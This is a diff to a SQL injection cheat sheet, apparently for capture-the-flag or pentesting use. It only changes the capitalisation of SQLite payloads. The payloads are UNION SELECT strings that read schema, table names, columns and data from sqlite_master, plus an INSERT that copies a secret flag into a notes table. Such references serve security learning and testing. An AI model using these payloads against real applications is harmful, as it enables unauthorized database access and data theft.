@@ -71,16 +71,16 @@
 
 ## SQLite
 - Extract previous query
-  - `union select sql from sqlite_master`
+  - `UNION SELECT sql FROM sqlite_master`
 
 - Extract table names 
-  - `union select name from sqlite_master where type='table'--`
+  - `UNION SELECT name FROM sqlite_master WHERE type='table'--`
   
 - Extract column names from table name
-  - `union select sql from sqlite_master where type='table' and name='<table_name>'--`
+  - `UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='<table_name>'--`
   
 - Extract data using column and table name
-  - `union select <column_name> from <table_name> where id=1--`
+  - `UNION SELECT <column_name> FROM <table_name> WHERE id=1--`
 
 ### Insert
   - `INSERT INTO notes(username, notes) VALUES('admin', (SELECT flag FROM secret LIMIT 0,1)); -- -`
